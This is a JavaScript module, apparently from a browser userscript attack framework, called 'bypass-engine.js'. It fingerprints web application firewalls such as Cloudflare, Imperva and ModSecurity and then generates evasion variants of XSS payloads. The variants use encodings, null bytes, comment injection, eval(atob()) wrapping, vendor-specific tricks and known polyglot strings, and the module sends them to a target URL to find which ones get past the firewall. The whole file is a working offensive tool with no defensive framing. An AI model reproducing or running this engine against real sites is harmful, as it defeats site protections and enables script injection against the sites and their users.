/**
 * @file bypass-engine.js
 * @description WAF/IDS/IPS detection and bypass techniques
 * @version 8.0.0
 */

(function() {
    'use strict';

    class BypassEngine {
        constructor(framework) {
            this.framework = framework;
            this.detectedWAF = null;
            this.bypassTechniques = new Map();
            this.successfulBypasses = [];
            
            this.initializeBypassTechniques();
        }

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // ğŸ›¡ï¸ WAF Detection
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        async detectWAF(url = window.location.href) {
            console.log('[Bypass] Detecting WAF/IDS/IPS...');

            const signatures = {
                cloudflare: {
                    headers: ['cf-ray', 'cf-cache-status'],
                    cookies: ['__cfduid', 'cf_clearance'],
                    content: /cloudflare/i,
                    challenge: /checking your browser/i
                },
                akamai: {
                    headers: ['akamai-origin-hop', 'akamai-x-cache'],
                    cookies: ['ak_bmsc'],
                    content: /akamai/i
                },
                imperva: {
                    headers: ['x-cdn', 'x-iinfo'],
                    cookies: ['incap_ses', 'visid_incap'],
                    content: /imperva|incapsula/i
                },
                f5: {
                    headers: ['x-wa-info'],
                    cookies: ['TS', 'TSxxxxxx'],
                    content: /f5[\s-]networks/i
                },
                awswaf: {
                    headers: ['x-amzn-requestid', 'x-amzn-trace-id'],
                    content: /aws/i
                },
                modsecurity: {
                    headers: ['server'],
                    content: /mod_security|modsecurity/i,
                    error: /403.*forbidden/i
                },
                sucuri: {
                    headers: ['x-sucuri-id', 'x-sucuri-cache'],
                    content: /sucuri/i
                },
                wordfence: {
                    content: /wordfence/i,
                    error: /generated by wordfence/i
                }
            };

            try {
                // Test with safe payload
                const testResponse = await this.sendTestRequest(url);
                
                for (const [name, sig] of Object.entries(signatures)) {
                    if (this.matchSignature(testResponse, sig)) {
                        this.detectedWAF = {
                            name: name,
                            confidence: 'high',
                            evidence: this.collectEvidence(testResponse, sig)
                        };
                        
                        console.log(`[Bypass] Detected WAF: ${name}`);
                        this.framework.emit('wafDetected', this.detectedWAF);
                        return this.detectedWAF;
                    }
                }

                // Test with XSS payload
                const xssResponse = await this.sendTestRequest(url, '<script>alert(1)</script>');
                
                if (xssResponse.blocked) {
                    this.detectedWAF = {
                        name: 'unknown',
                        confidence: 'medium',
                        evidence: 'Request was blocked by unknown WAF'
                    };
                }

                return this.detectedWAF;

            } catch (error) {
                console.error('[Bypass] WAF detection failed:', error);
                return null;
            }
        }

        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // ğŸ§ª Send Test Request
        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        async sendTestRequest(url, payload = null) {
            return new Promise((resolve) => {
                const testUrl = payload ? `${url}${url.includes('?') ? '&' : '?'}test=${encodeURIComponent(payload)}` : url;
                
                GM_xmlhttpRequest({
                    method: 'GET',
                    url: testUrl,
                    timeout: 5000,
                    onload: (response) => {
                        resolve({
                            status: response.status,
                            headers: this.parseHeaders(response.responseHeaders),
                            body: response.responseText,
                            blocked: response.status === 403 || response.status === 406
                        });
                    },
                    onerror: () => {
                        resolve({ blocked: true, error: true });
                    },
                    ontimeout: () => {
                        resolve({ blocked: false, timeout: true });
                    }
                });
            });
        }

        parseHeaders(headerString) {
            const headers = {};
            headerString.split('\n').forEach(line => {
                const [key, value] = line.split(':').map(s => s.trim());
                if (key) headers[key.toLowerCase()] = value;
            });
            return headers;
        }

        matchSignature(response, signature) {
            let matches = 0;

            // Check headers
            if (signature.headers) {
                for (const header of signature.headers) {
                    if (response.headers && response.headers[header.toLowerCase()]) {
                        matches++;
                    }
                }
            }

            // Check content
            if (signature.content && response.body) {
                if (signature.content.test(response.body)) {
                    matches++;
                }
            }

            // Check error patterns
            if (signature.error && response.blocked && response.body) {
                if (signature.error.test(response.body)) {
                    matches++;
                }
            }

            return matches > 0;
        }

        collectEvidence(response, signature) {
            const evidence = [];
            
            if (signature.headers) {
                signature.headers.forEach(h => {
                    if (response.headers[h.toLowerCase()]) {
                        evidence.push(`Header: ${h} = ${response.headers[h.toLowerCase()]}`);
                    }
                });
            }

            return evidence;
        }

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // ğŸ”“ Initialize Bypass Techniques
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        initializeBypassTechniques() {
            // Case variation
            this.bypassTechniques.set('case', {
                name: 'Case Variation',
                apply: (payload) => [
                    payload.toLowerCase(),
                    payload.toUpperCase(),
                    this.randomCase(payload)
                ]
            });

            // Encoding
            this.bypassTechniques.set('encoding', {
                name: 'Multiple Encoding',
                apply: (payload) => [
                    this.htmlEntityEncode(payload),
                    this.urlEncode(payload),
                    this.doubleUrlEncode(payload),
                    this.unicodeEncode(payload),
                    this.hexEncode(payload)
                ]
            });

            // Comment injection
            this.bypassTechniques.set('comments', {
                name: 'Comment Injection',
                apply: (payload) => [
                    payload.replace(/<(\w+)/g, '<$1<!---->'),
                    payload.replace(/(\w)(\w)/g, '$1/*comment*/$2'),
                    payload.replace(/=/g, '=/**/'),
                    payload.replace(/\s/g, '/**/')
                ]
            });

            // Null byte injection
            this.bypassTechniques.set('nullbyte', {
                name: 'Null Byte',
                apply: (payload) => [
                    payload.replace(/<(\w+)/g, '<$1\x00'),
                    payload.replace(/"/g, '"\x00'),
                    payload + '\x00'
                ]
            });

            // Character substitution
            this.bypassTechniques.set('charsubst', {
                name: 'Character Substitution',
                apply: (payload) => [
                    payload.replace(/</g, '\u003c'),
                    payload.replace(/>/g, '\u003e'),
                    payload.replace(/"/g, '\u0022'),
                    payload.replace(/'/g, '\u0027'),
                    payload.replace(/script/gi, 'scr\u0069pt')
                ]
            });

            // Tag manipulation
            this.bypassTechniques.set('tag', {
                name: 'Tag Manipulation',
                apply: (payload) => [
                    payload.replace(/<script/gi, '<script/+/'),
                    payload.replace(/<script/gi, '<script x="'),
                    payload.replace(/<(\w+)/g, '<$1/'),
                    payload.replace(/<script/gi, '<ScRiPt'),
                    payload.replace(/script/gi, 'svg onload')
                ]
            });

            // Whitespace manipulation
            this.bypassTechniques.set('whitespace', {
                name: 'Whitespace Manipulation',
                apply: (payload) => [
                    payload.replace(/\s/g, '\t'),
                    payload.replace(/\s/g, '\n'),
                    payload.replace(/\s/g, '\r'),
                    payload.replace(/\s/g, '\f'),
                    payload.replace(/\s/g, '')
                ]
            });

            // Protocol manipulation
            this.bypassTechniques.set('protocol', {
                name: 'Protocol Manipulation',
                apply: (payload) => [
                    payload.replace(/javascript:/gi, 'java\x00script:'),
                    payload.replace(/javascript:/gi, 'j&#x61;vascript:'),
                    payload.replace(/javascript:/gi, 'jav&#x09;ascript:'),
                    payload.replace(/javascript:/gi, 'data:text/html,')
                ]
            });

            // Concatenation
            this.bypassTechniques.set('concat', {
                name: 'String Concatenation',
                apply: (payload) => [
                    this.stringConcat(payload),
                    this.evalConcat(payload),
                    this.fromCharCodeConcat(payload)
                ]
            });

            // Polyglot
            this.bypassTechniques.set('polyglot', {
                name: 'Polyglot Payloads',
                apply: (payload) => this.generatePolyglots(payload)
            });
        }

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // ğŸ¯ Apply Bypass Techniques
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        async applyBypass(payload, waf = null) {
            const targetWAF = waf || this.detectedWAF;
            const bypassedPayloads = [];

            if (targetWAF) {
                // Use WAF-specific bypasses
                const specific = await this.getWAFSpecificBypasses(targetWAF.name);
                bypassedPayloads.push(...specific.map(b => b(payload)));
            }

            // Apply all generic techniques
            for (const [name, technique] of this.bypassTechniques) {
                try {
                    const variants = technique.apply(payload);
                    bypassedPayloads.push(...variants.map(v => ({
                        payload: v,
                        technique: name,
                        original: payload
                    })));
                } catch (error) {
                    console.error(`[Bypass] Technique ${name} failed:`, error);
                }
            }

            return bypassedPayloads;
        }

        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // ğŸ¯ WAF-Specific Bypasses
        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        async getWAFSpecificBypasses(wafName) {
            const bypasses = {
                cloudflare: [
                    (p) => p.replace(/<script/gi, '<script/x'),
                    (p) => p.replace(/alert/gi, 'prompt'),
                    (p) => `<svg/onload=${p}>`,
                    (p) => p.replace(/document\.cookie/g, 'document["cook"+"ie"]')
                ],
                modsecurity: [
                    (p) => this.doubleUrlEncode(p),
                    (p) => p.replace(/and/gi, 'AND'),
                    (p) => p.replace(/or/gi, 'OR'),
                    (p) => p + '/**/'
                ],
                imperva: [
                    (p) => p.replace(/</g, '%3C'),
                    (p) => this.utf7Encode(p),
                    (p) => p.split('').join('\u200b') // Zero-width space
                ],
                awswaf: [
                    (p) => p.replace(/script/gi, 'scri\\x70t'),
                    (p) => `${p}${'\n'.repeat(100)}`, // Newline padding
                    (p) => p.replace(/=/g, '\u003d')
                ],
                wordfence: [
                    (p) => `<!--${p}-->`,
                    (p) => p.replace(/</g, '&lt;').replace(/>/g, '&gt;'),
                    (p) => btoa(p)
                ]
            };

            return bypasses[wafName.toLowerCase()] || [];
        }

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // ğŸ§¬ Encoding Methods
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        htmlEntityEncode(str) {
            return Array.from(str)
                .map(c => `&#${c.charCodeAt(0)};`)
                .join('');
        }

        urlEncode(str) {
            return encodeURIComponent(str);
        }

        doubleUrlEncode(str) {
            return encodeURIComponent(encodeURIComponent(str));
        }

        unicodeEncode(str) {
            return Array.from(str)
                .map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`)
                .join('');
        }

        hexEncode(str) {
            return Array.from(str)
                .map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`)
                .join('');
        }

        utf7Encode(str) {
            // Simplified UTF-7 encoding for bypasses
            return '+' + btoa(str).replace(/=+$/, '') + '-';
        }

        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // ğŸ”— Concatenation Methods
        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        stringConcat(str) {
            return str.split('').map(c => `'${c}'`).join('+');
        }

        evalConcat(str) {
            return `eval(atob('${btoa(str)}'))`;
        }

        fromCharCodeConcat(str) {
            const codes = Array.from(str).map(c => c.charCodeAt(0));
            return `String.fromCharCode(${codes.join(',')})`;
        }

        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // ğŸ­ Polyglot Generation
        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        generatePolyglots(basePayload) {
            return [
                `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e`,
                `'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">`,
                `'">><script>alert(String.fromCharCode(88,83,83))</script>`,
                `"><img src=x onerror=prompt(1);>`,
                `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`,
            ];
        }

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // ğŸ§ª Test Bypass
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        async testBypass(url, bypassedPayload) {
            const response = await this.sendTestRequest(url, bypassedPayload.payload);
            
            if (!response.blocked) {
                this.successfulBypasses.push({
                    payload: bypassedPayload,
                    technique: bypassedPayload.technique,
                    waf: this.detectedWAF?.name,
                    timestamp: Date.now()
                });

                this.framework.emit('bypassSuccess', {
                    payload: bypassedPayload,
                    waf: this.detectedWAF
                });

                return true;
            }

            return false;
        }

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // ğŸ“Š Bypass Statistics
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        getStatistics() {
            const byTechnique = {};
            
            this.successfulBypasses.forEach(bypass => {
                byTechnique[bypass.technique] = (byTechnique[bypass.technique] || 0) + 1;
            });

            return {
                total: this.successfulBypasses.length,
                waf: this.detectedWAF?.name || 'unknown',
                byTechnique: byTechnique,
                mostSuccessful: Object.entries(byTechnique)
                    .sort((a, b) => b[1] - a[1])[0]?.[0] || 'none'
            };
        }

        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // ğŸ› ï¸ Utility Methods
        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        randomCase(str) {
            return Array.from(str)
                .map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase())
                .join('');
        }

        getSuccessfulBypasses() {
            return this.successfulBypasses;
        }

        clearHistory() {
            this.successfulBypasses = [];
        }
    }

    // Export
    exports.BypassEngine = BypassEngine;
    exports.create = (framework) => new BypassEngine(framework);
})();